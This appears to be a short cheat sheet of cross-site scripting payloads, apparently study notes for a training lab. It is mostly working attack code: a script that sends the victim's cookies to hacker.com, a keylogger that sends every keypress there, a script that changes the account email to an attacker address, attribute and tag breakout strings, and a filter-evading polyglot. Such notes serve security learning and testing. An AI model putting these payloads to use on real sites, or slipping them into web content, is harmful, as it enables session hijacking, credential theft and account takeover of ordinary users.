### Stealing cookie
```js
<script>
	fetch('https://hacker.com/steal?cookie=' + btoa(document.cookie));
</script>
```

### Logging keys
```js
<script>
	document.onkeypress = function(e) {
		fetch('https://hacker.com/log?key=' + btoa(e.key));
	}
</script>
```

### Business Logic
```js
<script>
	user.changeEmail('attacker@hacker.com');
</script>
```

- Perform password reset?!?

- Blind XSS can be automated using `XSS Hunter Express`

## Bypassing restrictions
```js
<h2> Hello <input value="Name"> </h2>
// "> <script>...</script>
```

```js
<h2> Hello <textarea> Name </textarea> </h2>
// </textarea> <script>...</script>
```

```js
<img src="Name">
// " onerror="alert(...);
```

## Polyglots

- bypasses everything in one:

```js
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e
```